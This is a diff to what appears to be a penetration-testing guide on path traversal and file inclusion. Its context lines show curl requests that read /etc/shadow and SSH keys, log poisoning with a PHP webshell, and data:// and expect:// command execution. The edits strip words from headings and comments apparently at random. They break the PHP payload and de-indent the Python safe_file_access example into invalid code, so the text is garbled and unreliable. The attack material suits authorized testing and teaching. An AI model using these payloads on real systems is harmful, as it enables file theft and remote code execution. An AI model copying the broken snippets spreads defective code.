@@ -40,7 +40,7 @@ Identify and exploit file path traversal (directory traversal) vulnerabilities t
 3. **Impact Assessment** - Accessible files and data exposure
 4. **Remediation Guidance** - Secure coding recommendations
 
-## Core Workflow
+## Workflow
 
 ### Phase 1: Understanding Path Traversal
 
@@ -133,18 +133,18 @@ curl "http://target.com/image?filename=../../../etc/passwd"
 curl "http://target.com/download?file=....//....//....//etc/passwd"
 ```
 
-#### Absolute Path Injection
+#### Path Injection
 
 ```bash
 
-# Direct absolute path (Linux)
+# Direct path (Linux)
 
 /etc/passwd
 /etc/shadow
 /etc/hosts
 /proc/self/environ
 
-# Direct absolute path (Windows)
+# Direct path (Windows)
 
 C:\windows\win.ini
 C:\windows\system32\drivers\etc\hosts
@@ -236,13 +236,13 @@ High-value files to target:
 
 ```bash
 
-# System files
+# files
 
 /etc/passwd           # User accounts
 /etc/shadow           # Password hashes (root only)
 /etc/group            # Group information
 /etc/hosts            # Host mappings
-/etc/hostname         # System hostname
+/etc/hostname # hostname
 /etc/issue            # System banner
 
 # SSH files
@@ -288,7 +288,7 @@ Windows-specific targets:
 
 ```bash
 
-# System files
+# files
 
 C:\windows\win.ini
 C:\windows\system.ini
@@ -316,7 +316,7 @@ C:\Users\<user>\Desktop\
 C:\Documents and Settings\<user>\
 ```
 
-### Phase 7: Automated Testing
+### Phase 7: Testing
 
 #### Using Burp Suite
 
@@ -381,7 +381,7 @@ curl "http://target.com/page?file=../../../var/log/apache2/access.log&cmd=id"
 
 # Include auth.log (SSH)
 
-# First: ssh '<?php system($_GET["cmd"]); ?>'@target.com
+# First: ssh '<?php($_GET["cmd"]); ?>'@target.com
 
 curl "http://target.com/page?file=../../../var/log/auth.log&cmd=whoami"
 ```
@@ -418,7 +418,7 @@ curl -X POST -d "<?php system('id'); ?>" \
 
 curl "http://target.com/page?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==&c=id"
 
-# expect:// - Execute system commands
+# expect:// - Execute commands
 
 curl "http://target.com/page?file=expect://id"
 ```
@@ -447,7 +447,7 @@ Structured testing approach:
 ....//....//....//etc/passwd
 ..;/..;/..;/etc/passwd
 
-# Step 5: Test absolute paths
+# Step 5: Test paths
 
 /etc/passwd
 
@@ -496,11 +496,11 @@ if ($realUserPath && strpos($realUserPath, $realBase) === 0) {
 import os
 
 def safe_file_access(base_dir, filename):
-    # Resolve to absolute path
+# Resolve to absolute path
     base = os.path.realpath(base_dir)
-    file_path = os.path.realpath(os.path.join(base, filename))
+file_path = os.path.realpath(os.path.join(base, filename))
     
-    # Verify file is within base directory
+# Verify file is within base directory
     if file_path.startswith(base):
         return open(file_path, 'r').read()
     else:
